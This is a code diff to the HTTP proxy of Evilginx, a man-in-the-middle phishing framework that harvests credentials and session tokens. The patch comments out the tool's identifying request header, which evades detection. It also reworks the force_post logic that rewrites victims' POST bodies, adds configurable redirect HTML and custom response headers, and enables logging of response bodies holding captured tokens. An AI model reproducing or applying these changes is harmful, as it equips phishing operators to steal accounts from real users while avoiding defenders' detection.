@@ -50,7 +50,8 @@ const (
 )
 
 const (
-	HOME_DIR = ".evilginx"
+	HOME_DIR              = ".evilginx"
+	DEFAULT_REDIRECT_CODE = "<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>"
 )
 
 const (
@@ -466,7 +467,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				//req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -583,6 +584,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						u, err := url.Parse(rurl)
 						if err == nil {
 							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
+								log.Debug("Performing login page redirect")
 								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 								if resp != nil {
 									resp.Header.Add("Location", rurl)
@@ -654,13 +656,113 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+				// force_post checking
+				if pl != nil {
+					body, err := ioutil.ReadAll(req.Body)
+					method := req.Method
+					if err == nil && method == "POST" {
+						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						log.Debug("POST URL: %s", req.URL.Path)
+						log.Debug("POST body = %s", body)
+						contentType := req.Header.Get("Content-type")
+
+						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
+						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")
+
+						if json_re.MatchString(contentType) {
+							// force post json
+							for _, fp := range pl.forcePost {
+								if fp.path.MatchString(req.URL.Path) {
+									log.Debug("force_post: url matched: %s", req.URL.Path)
+									ok_search := false
+									if len(fp.search) > 0 {
+										k_matched := len(fp.search)
+										for _, fp_s := range fp.search {
+											matches := fp_s.key.FindAllString(string(body), -1)
+											for _, match := range matches {
+												if fp_s.search.MatchString(match) {
+													if k_matched > 0 {
+														k_matched -= 1
+													}
+													log.Debug("force_post: [%d] matched - %s", k_matched, match)
+													break
+												}
+											}
+										}
+										if k_matched == 0 {
+											ok_search = true
+										}
+									} else {
+										ok_search = true
+									}
+									if ok_search {
+										for _, fp_f := range fp.force {
+											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
+											if err != nil {
+												log.Debug("force_post: got error: %s", err)
+											}
+											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
+										}
+									}
+									req.ContentLength = int64(len(body))
+									log.Debug("force_post: body: %s len:%d", body, len(body))
+								}
+							}
+						} else if form_re.MatchString(contentType) {
+
+							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
+								log.Debug("POST: %s", req.URL.Path)
+								// force posts
+								for _, fp := range pl.forcePost {
+									if fp.path.MatchString(req.URL.Path) {
+										log.Debug("force_post: url matched: %s", req.URL.Path)
+										ok_search := false
+										if len(fp.search) > 0 {
+											log.Debug("search applies, len: %d", len(fp.search))
+											k_matched := len(fp.search)
+											for _, fp_s := range fp.search {
+												log.Debug("fpsearch %s", fp_s)
+												for k, v := range req.PostForm {
+													log.Debug("post form: %s : %s", k, v[0])
+													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
+														if k_matched > 0 {
+															k_matched -= 1
+														}
+														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
+														break
+													}
+												}
+											}
+											if k_matched == 0 {
+												ok_search = true
+											}
+										} else {
+											ok_search = true
+										}
+
+										if ok_search {
+											for _, fp_f := range fp.force {
+												req.PostForm.Set(fp_f.key, fp_f.value)
+											}
+											body = []byte(req.PostForm.Encode())
+											req.ContentLength = int64(len(body))
+											log.Debug("force_post: body: %s len:%d", body, len(body))
+										}
+									}
+								}
+							}
+						}
+						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+					}
+
+				}
+
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					//req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
-
 						// patch phishing URLs in JSON body with original domains
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
 						req.ContentLength = int64(len(body))
@@ -707,45 +809,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Error("database: %v", err)
 										}
 									}
-								}
-							}
-
-							// force post json
-							for _, fp := range pl.forcePost {
-								if fp.path.MatchString(req.URL.Path) {
-									log.Debug("force_post: url matched: %s", req.URL.Path)
-									ok_search := false
-									if len(fp.search) > 0 {
-										k_matched := len(fp.search)
-										for _, fp_s := range fp.search {
-											matches := fp_s.key.FindAllString(string(body), -1)
-											for _, match := range matches {
-												if fp_s.search.MatchString(match) {
-													if k_matched > 0 {
-														k_matched -= 1
-													}
-													log.Debug("force_post: [%d] matched - %s", k_matched, match)
-													break
-												}
-											}
-										}
-										if k_matched == 0 {
-											ok_search = true
-										}
-									} else {
-										ok_search = true
-									}
-									if ok_search {
-										for _, fp_f := range fp.force {
-											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
-											if err != nil {
-												log.Debug("force_post: got error: %s", err)
-											}
-											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
-										}
-									}
-									req.ContentLength = int64(len(body))
-									log.Debug("force_post: body: %s len:%d", body, len(body))
 								}
 							}
 
@@ -807,42 +870,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								body = []byte(req.PostForm.Encode())
 								req.ContentLength = int64(len(body))
 
-								// force posts
-								for _, fp := range pl.forcePost {
-									if fp.path.MatchString(req.URL.Path) {
-										log.Debug("force_post: url matched: %s", req.URL.Path)
-										ok_search := false
-										if len(fp.search) > 0 {
-											k_matched := len(fp.search)
-											for _, fp_s := range fp.search {
-												for k, v := range req.PostForm {
-													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
-														if k_matched > 0 {
-															k_matched -= 1
-														}
-														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
-														break
-													}
-												}
-											}
-											if k_matched == 0 {
-												ok_search = true
-											}
-										} else {
-											ok_search = true
-										}
-
-										if ok_search {
-											for _, fp_f := range fp.force {
-												req.PostForm.Set(fp_f.key, fp_f.value)
-											}
-											body = []byte(req.PostForm.Encode())
-											req.ContentLength = int64(len(body))
-											log.Debug("force_post: body: %s len:%d", body, len(body))
-										}
-									}
-								}
-
 							}
 
 						}
@@ -857,7 +884,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
 							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
 							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
-								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+								//return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+								headers := make(map[string]string)
+								if ic.headers != nil {
+									headers = ic.headers
+								}
+								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime, headers)
 							}
 						}
 					}
@@ -931,6 +963,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_hostname := strings.ToLower(resp.Request.Host)
+			log.Debug("response %s, %s ", resp.Request.Host, resp.Request.RequestURI)
 
 			// if "Location" header is present, make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
@@ -1005,13 +1038,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			body, err := ioutil.ReadAll(resp.Body)
 
 			if pl != nil {
-				if s, ok := p.sessions[ps.SessionId]; ok {
+				//log.Debug("pre session hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
+				if s, ok := p.sessions[ps.SessionId]; ok { // commented this to check for session confirmation
+
+					//log.Debug("post session hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
 					// capture body response tokens
 					for k, v := range pl.bodyAuthTokens {
 						if _, ok := s.BodyTokens[k]; !ok {
-							//log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
+							log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
 							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
-								//log.Debug("RESPONSE body = %s", string(body))
+								log.Debug("RESPONSE body = %s", string(body))
 								token_re := v.search.FindStringSubmatch(string(body))
 								if token_re != nil && len(token_re) >= 2 {
 									s.BodyTokens[k] = token_re[1]
@@ -1029,7 +1065,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 						}
 					}
-				}
+
+				} // commented this to check for session confirmation
 
 				// check if we have all tokens
 				if len(pl.authUrls) == 0 {
@@ -1297,7 +1334,7 @@ func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Respon
 	return req, nil
 }
 
-func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
+func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string, headers map[string]string) (*http.Request, *http.Response) {
 	if mime == "" {
 		mime = "text/plain"
 	}
@@ -1307,13 +1344,22 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 		if origin != "" {
 			resp.Header.Set("Access-Control-Allow-Origin", origin)
 		}
+
+		for headerKey, headerValue := range headers {
+			resp.Header.Set(headerKey, headerValue)
+		}
+
 		return req, resp
 	}
 	return req, nil
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
+	redir := p.cfg.GetCustomRedir()
+	if redir == "" {
+		redir = DEFAULT_REDIRECT_CODE
+	}
+	body := fmt.Sprintf(redir, rurl)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
 		return req, resp
